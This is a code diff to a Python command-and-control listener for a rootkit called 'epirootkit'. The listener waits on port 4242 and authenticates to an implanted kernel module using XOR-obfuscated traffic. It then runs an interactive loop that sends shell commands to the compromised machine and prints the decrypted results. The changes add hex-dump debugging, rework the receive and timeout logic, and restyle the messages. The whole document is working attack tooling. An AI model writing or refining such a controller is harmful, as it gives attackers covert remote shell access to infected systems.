@@ -1,39 +1,43 @@
 import socket
 import sys
 import time
+import binascii
 
 DEBUG = True
 KEY = "epirootkit"
 HOST = "0.0.0.0"
 PORT = 4242
 
+def debug_hexdump(prefix, data):
+    if DEBUG:
+        hex_dump = ' '.join(f'{b:02x}' for b in data)
+        print(f"[DEBUG] {prefix} Hex dump: {hex_dump}")
+        try:
+            print(f"[DEBUG] {prefix} ASCII: {data.decode('ascii', errors='replace')}")
+        except:
+            pass
+
 def xor_encrypt(data: bytes) -> bytes:
     """
     Implements the same XOR encryption as the kernel module:
     encrypted[i] = msg[i] ^ config.xor_key[i % strlen(config.xor_key)]
     """
-    result = bytearray()
     key_bytes = KEY.encode('ascii')
     key_len = len(key_bytes)
+    result = bytearray()
+
+    debug_hexdump("Original", data)
 
     for i in range(len(data)):
-        result.append(data[i] ^ key_bytes[i % key_len])
-    return bytes(result)
+        enc_byte = data[i] ^ key_bytes[i % key_len]
+        result.append(enc_byte)
 
-def debug_print(msg: str, data: bytes = None):
-    if DEBUG:
-        print(f"[DEBUG] {msg}")
-        if data:
-            print(f"[DEBUG] Raw data: {data}")
-            print(f"[DEBUG] Hex: {data.hex()}")
-            try:
-                print(f"[DEBUG] ASCII: {data.decode('ascii', errors='ignore')}")
-            except:
-                pass
+    debug_hexdump("Encrypted", result)
+    return bytes(result)
 
 def receive_until_eof(client, timeout=5):
     """Receive data until --EOF-- marker is found or timeout occurs"""
-    client.settimeout(0.1)  # Short timeout for quick chunks
+    client.settimeout(0.1)
     start_time = time.time()
     response = bytearray()
 
@@ -41,18 +45,18 @@ def receive_until_eof(client, timeout=5):
         try:
             chunk = client.recv(2048)
             if not chunk:
-                break
-            response.extend(chunk)
-
-            # Try to decode and check for EOF marker
-            try:
-                decrypted = xor_encrypt(response).decode('ascii', errors='ignore')
-                if '--EOF--' in decrypted:
+                if response:  # If we already have some data, process it
                     break
-            except:
-                pass
+                continue
+
+            response.extend(chunk)
+            decrypted = xor_encrypt(response)
+            if b'--EOF--' in decrypted:
+                break
 
         except socket.timeout:
+            if response:  # If we have data but hit timeout, process what we have
+                break
             continue
         except Exception as e:
             print(f"Error receiving data: {e}")
@@ -65,32 +69,31 @@ def handle_client(client):
         # Send encrypted password
         password = b"epirootkit\n"
         encrypted_pass = xor_encrypt(password)
-        debug_print("Sending encrypted password", encrypted_pass)
+        print("[*] Sending authentication...")
         client.sendall(encrypted_pass)
 
         # Receive and decrypt auth response
         auth_response_encrypted = receive_until_eof(client)
         if not auth_response_encrypted:
-            print("No response received")
+            print("[-] No response received")
             return
 
         auth_response = xor_encrypt(auth_response_encrypted)
-        debug_print("Received encrypted auth response", auth_response_encrypted)
-        debug_print("Decrypted auth response", auth_response)
-
         try:
             auth_text = auth_response.decode('ascii', errors='ignore')
-            print("--- AUTH ---")
+            print("[+] Authentication response:")
             print(auth_text.replace('--EOF--', '').strip())
-            print("------------\n")
 
             if "FAIL" in auth_text:
-                print("Authentication failed. Exiting.")
+                print("[-] Authentication failed")
                 return
 
         except UnicodeDecodeError:
-            print("Warning: Received corrupted auth response")
+            print("[-] Received corrupted auth response")
             return
+
+        print("[+] Successfully authenticated")
+        print("[*] Enter commands (type 'exit' to quit):")
 
         # Interactive shell loop
         while True:
@@ -99,7 +102,7 @@ def handle_client(client):
                 if not cmd:
                     continue
                 if cmd.lower() == "exit":
-                    # Send encrypted exit command
+                    print("[*] Sending exit command...")
                     encrypted_cmd = xor_encrypt(b"exit\n")
                     client.sendall(encrypted_cmd)
                     break
@@ -107,33 +110,31 @@ def handle_client(client):
                 # Send encrypted command
                 cmd_bytes = (cmd + "\n").encode('ascii')
                 encrypted_cmd = xor_encrypt(cmd_bytes)
-                debug_print(f"Sending encrypted command: {cmd}", encrypted_cmd)
                 client.sendall(encrypted_cmd)
 
                 # Receive and decrypt response
                 response_encrypted = receive_until_eof(client)
                 if response_encrypted:
                     response = xor_encrypt(response_encrypted)
-                    debug_print("Received encrypted response", response_encrypted)
-                    debug_print("Decrypted response", response)
-
                     try:
                         response_text = response.decode('ascii', errors='ignore')
-                        print(response_text.replace('--EOF--', '').strip())
+                        output = response_text.replace('--EOF--', '').strip()
+                        if output:
+                            print(output)
                     except UnicodeDecodeError:
-                        print("Warning: Received corrupted response")
+                        print("[-] Received corrupted response")
 
             except KeyboardInterrupt:
-                print("\nSending exit command...")
+                print("\n[*] Sending exit command...")
                 encrypted_cmd = xor_encrypt(b"exit\n")
                 client.sendall(encrypted_cmd)
                 break
             except Exception as e:
-                print(f"Error during command execution: {e}")
+                print(f"[-] Error during command execution: {e}")
                 break
 
     except Exception as e:
-        print(f"Error handling client: {e}")
+        print(f"[-] Connection error: {e}")
 
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
@@ -146,12 +147,14 @@ def main():
             while True:
                 client, addr = server.accept()
                 print(f"[+] Connection from {addr[0]}:{addr[1]}")
+                client.settimeout(5)  # Set a default timeout
                 handle_client(client)
+                client.close()
 
         except KeyboardInterrupt:
-            print("\nShutting down server...")
+            print("\n[*] Shutting down server...")
         except Exception as e:
-            print(f"Server error: {e}")
+            print(f"[-] Server error: {e}")
 
 if __name__ == "__main__":
     main()
